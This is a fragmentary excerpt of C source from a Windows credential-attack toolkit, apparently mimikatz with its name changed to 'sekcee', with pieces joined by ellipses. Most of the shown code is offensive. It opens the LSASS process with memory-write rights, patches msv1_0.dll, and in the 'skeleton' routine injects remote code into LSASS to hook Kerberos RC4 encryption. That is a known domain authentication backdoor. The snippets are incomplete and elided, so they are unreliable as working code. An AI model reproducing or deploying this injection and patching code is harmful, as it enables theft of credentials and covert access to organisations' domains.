...
BOOL CALLBACK kuhl_m_misc_detours_callback_module_name_addr(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	...
	{
		sekcee_stdout(L"\t(%wZ)", pModuleInformation->NameDontUseOutsideCallback);
		return FALSE;
	}
	return TRUE;
}
...
BOOL CALLBACK kuhl_m_misc_detours_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg)
{
	...
	if((pExportedEntryInformations->function.address))
	{
		...
		if(dstJmp)
		{
			sekcee_stdout(L"\t[%u] %wZ ! ", level, (((PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION) pvArg)->NameDontUseOutsideCallback));

			if(pExportedEntryInformations->name)
				sekcee_stdout(L"%-32S", pExportedEntryInformations->name);
			else
				sekcee_stdout(L"# %u", pExportedEntryInformations->ordinal);

			sekcee_stdout(L"\t %p -> %p", pExportedEntryInformations->function.address, dstJmp);
...
//	if(argc > 1)
//	{
//		if((SEKCEE_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7) && (SEKCEE_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8))
//		{
//			pOs = w2k8r2;
//			pOsSz = ARRAYSIZE(w2k8r2);
//		}
//		else if((SEKCEE_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_8) && (SEKCEE_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE))
//		{
//			pOs = w2k12;
//			pOsSz = ARRAYSIZE(w2k12);
//		}
//		else if((SEKCEE_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE) && (SEKCEE_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_10))
//		{
//			pOs = w2k12r2;
//			pOsSz = ARRAYSIZE(w2k12r2);
//		}
//		else if(SEKCEE_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10)
//		{
//			pOs = wservprev;
...
//									if(littleSuccess)
//									{
//										sekcee_stdout(L"SIDHistory for \'%s\'\n", argv[0]);
//										for(i = 1; i < (DWORD) argc; i++)
//										{
//											sekcee_stdout(L" * %s\t", argv[i]);
		...
		if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, processId))
		{
			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aLsass.hMemory))
			{
				if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"msv1_0.dll", &iMSV))
				{
					...
					if(pGeneric = kull_m_patch_getGenericFromBuild(MSV1_0AcceptReferences, ARRAYSIZE(MSV1_0AcceptReferences), SEKCEE_NT_BUILD_NUMBER))
					{
...
NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
{
	...
	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
	BOOL onlyRC4Stuff = (SEKCEE_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA) || kull_m_string_args_byName(argc, argv, L"letaes", NULL, NULL);
					...
					if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"cryptdll.dll", &cryptInfos))
					{
						...
						if(NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
						{
							...
							if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(aLsass.hMemory, kuhl_misc_skeleton_rc4_init, (DWORD) ((PBYTE) kuhl_misc_skeleton_rc4_end - (PBYTE) kuhl_misc_skeleton_rc4_init), &extForCb, &aLsass))
							{
								...
								{
									sekcee_stdout(L"[RC4] init patch OK\n");
									...
									if(kull_m_memory_copy(&aLsass, &aLocal, sizeof(PVOID)))
										sekcee_stdout(L"[RC4] decrypt patch OK\n");
								}
							}
...
#define SEKCEE_COMPRESSED_FILENAME	SEKCEE L"_" SEKCEE_ARCH L".compressed"
...
#pragma warning(pop)
	sekcee_stdout(L"Using \'%s\' as input file\n", fileName);
	if(kull_m_file_readData(fileName, &data, &size))
	{
		sekcee_stdout(L" * Original size  : %u\n", size);
		if(kull_m_memory_quick_compress(data, size, (PVOID *) &compressedData, &compressedSize))
		{
			sekcee_stdout(L" * Compressed size: %u (%.2f%%)\nUsing \'%s\' as output file... ", compressedSize, 100 * ((float) compressedSize / (float) size), SEKCEE_COMPRESSED_FILENAME);
			if(kull_m_file_writeData(SEKCEE_COMPRESSED_FILENAME, compressedData, compressedSize))
				sekcee_stdout(L"OK!\n");
